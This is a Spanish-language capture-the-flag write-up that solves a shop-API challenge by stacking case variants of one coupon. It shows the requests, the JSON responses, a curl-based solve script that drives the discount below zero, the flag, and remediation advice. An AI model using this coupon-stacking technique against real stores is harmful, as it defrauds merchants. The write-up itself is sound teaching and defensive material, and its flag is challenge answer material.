# Write-up — Coupon Collector

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | API |
| **Dificultad** | Easy |
| **Puntos** | 100 |
| **Flag** | `flag{646fe594a28842c3}` |
| **Vulnerabilidad** | Business Logic — apilamiento de cupones por bypass case-insensitive |

---

## 1. Enunciado

> ShopEZ is having a sale: **WELCOME20** takes 20% off. Generous.
>
> JSON REST API, cookie sessions. Endpoints: `/api/products`, `/api/cart`, `/api/apply-coupon`, `/api/checkout`.

Instancia desplegada: `https://aa35dd0bffb0db57.chal.ctf.ae`

El reto simula la API de una tienda ("ShopEZ") con un flujo de compra clásico:
listar productos → agregar al carrito → aplicar cupón → hacer checkout. El objetivo
es conseguir la flag, que la tienda entrega al completar una orden en condiciones
que no deberían ser posibles.

---

## 2. Reconocimiento

### 2.1 Productos

```http
GET /api/products
```
```json
{"products":[
  {"id":1,"name":"Wireless Headphones","price":59.99},
  {"id":2,"name":"USB-C Hub","price":34.99},
  {"id":3,"name":"Mechanical Keyboard","price":89.99},
  {"id":4,"name":"Laptop Stand","price":29.99},
  {"id":5,"name":"Webcam HD","price":44.99}]}
```

### 2.2 Carrito

El estado del carrito lo devuelve `GET /api/cart`:

```json
{"applied_coupons":[], "cart":[], "discount_amount":0.0,
 "discount_percent":0.0, "subtotal":0, "total":0.0}
```

Dos detalles saltan a la vista desde el recon:

- **`applied_coupons` es una lista.** Un diseño que soporta múltiples cupones a la
  vez es terreno fértil para *coupon stacking*.
- **`discount_percent` es acumulativo** y se resta directamente del subtotal.

Para agregar al carrito el campo correcto es `product_id` (no `productId`):

```http
POST /api/cart
Content-Type: application/json

{"product_id":1,"quantity":1}
```
```json
{"cart_size":1,"message":"Added Wireless Headphones to cart"}
```

Carrito tras agregar: `subtotal: 59.99`, `total: 59.99`.

### 2.3 Cupones

El endpoint `/api/apply-coupon` espera el campo `coupon` (los nombres típicos
`coupon_code`, `code`, etc. devuelven `"Missing coupon code"`):

```http
POST /api/apply-coupon
Content-Type: application/json

{"coupon":"WELCOME20"}
```
```json
{"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":47.99}
```

Funciona: 20% de descuento, total 47.99.

---

## 3. Encontrando la vulnerabilidad

El primer instinto —apilar el mismo cupón— está protegido:

```json
// segundo POST {"coupon":"WELCOME20"}
{"error":"Coupon already applied"}
```

Existe un control anti-duplicado. La pregunta clave es **sobre qué valor compara**.
Como `applied_coupons` es una lista, la app claramente contempla varios cupones;
solo hay que hacer que el mismo cupón "parezca" distinto ante ese control.

Prueba con variaciones de mayúsculas/minúsculas del mismo código:

```
[welcome20]  -> discount 40%  total 35.99   ✅ aceptado
[Welcome20]  -> discount 60%  total 24.00   ✅ aceptado
[WeLcOmE20]  -> discount 80%  total 12.00   ✅ aceptado
[WELCOME20 ] -> "Invalid coupon code"       ❌ (espacio final)
```

**Ahí está el bug.** La lógica tiene dos comparaciones inconsistentes:

1. **Resolución del descuento** → *case-insensitive*: `welcome20`, `Welcome20`,
   `WeLcOmE20` se normalizan al cupón válido `WELCOME20` y otorgan su 20%.
2. **Control de "ya aplicado"** → *case-sensitive*: guarda/compara el string
   **literal** que envió el cliente, así que `welcome20` ≠ `WELCOME20` ≠
   `WeLcOmE20`, y cada uno se considera un cupón nuevo.

Resultado: el mismo cupón del 20% se puede aplicar tantas veces como
permutaciones de caja tenga la palabra (`welcome20` tiene 7 letras → 2⁷ = 128
variantes), y **no hay tope al descuento total**. El matcher sí normaliza la caja
pero **no recorta espacios**, por eso las variantes con espacios fallan.

---

## 4. Explotación

Basta con apilar 5 variantes (100%) para llegar a total 0, pero el checkout se
completa igual —o mejor— con total negativo. Se aplican 9 variantes distintas
para dejarlo claramente por debajo de cero:

```
WELCOME20 welcome20 Welcome20 WeLcOmE20 wELCOME20 WElcome20 welCOME20 WELcome20 wELcOmE20
```

Estado del carrito tras apilar:

```json
{"applied_coupons":["WELCOME20","welcome20","Welcome20","WeLcOmE20","wELCOME20",
  "WElcome20","welCOME20","WELcome20","wELcOmE20"],
 "cart":[{"id":1,"name":"Wireless Headphones","price":59.99}],
 "discount_amount":107.98,"discount_percent":180.0,"subtotal":59.99,"total":-47.99}
```

Checkout:

```http
POST /api/checkout
Content-Type: application/json

{}
```
```json
{"flag":"flag{646fe594a28842c3}","message":"Order completed!",
 "order_id":"308291ab","total":0.0}
```

### Script de solución (`solve.sh`)

```bash
#!/usr/bin/env bash
B="https://aa35dd0bffb0db57.chal.ctf.ae"
J='Content-Type: application/json'
curl -s -c c.txt "$B/api/products" >/dev/null
curl -s -b c.txt -c c.txt -H "$J" -d '{"product_id":1,"quantity":1}' "$B/api/cart" >/dev/null
for v in WELCOME20 welcome20 Welcome20 WeLcOmE20 wELCOME20 WElcome20 welCOME20 WELcome20 wELcOmE20; do
  curl -s -b c.txt -c c.txt -H "$J" -d "{\"coupon\":\"$v\"}" "$B/api/apply-coupon" >/dev/null
done
curl -s -b c.txt -c c.txt -H "$J" -d '{}' "$B/api/checkout"; echo
```

---

## 5. Flag

```
flag{646fe594a28842c3}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** normalización inconsistente de la entrada. El código normaliza la
caja del cupón para *buscar el descuento* pero no para *verificar duplicados*, de
modo que dos representaciones del mismo cupón se tratan como iguales en un punto y
como distintas en otro.

**Cómo se arregla:**

- **Canonicalizar una sola vez, al inicio.** Aplicar `code = code.strip().upper()`
  (o `.lower()`) antes de cualquier lógica, y usar ese valor tanto para resolver el
  descuento como para el control de duplicados. Una única fuente de verdad.
- **Validar contra el conjunto de cupones canónicos** y rechazar el resto.
- **Poner un tope al descuento** (`min(discount, 100%)`) y **rechazar totales ≤ 0**
  en el checkout: defensa en profundidad para que un fallo de apilamiento no derive
  en órdenes gratis.
- **Idempotencia del cupón:** un cupón por código canónico por carrito, no una lista
  que crece sin control.

**Lección de CTF:** cuando una API expone una lista donde esperarías un valor único
(`applied_coupons: []`) y hay un control de "ya aplicado", el ataque casi siempre es
hacer que el mismo objeto evada ese control por diferencias de normalización —
mayúsculas, espacios, Unicode, ceros a la izquierda o parámetros duplicados.
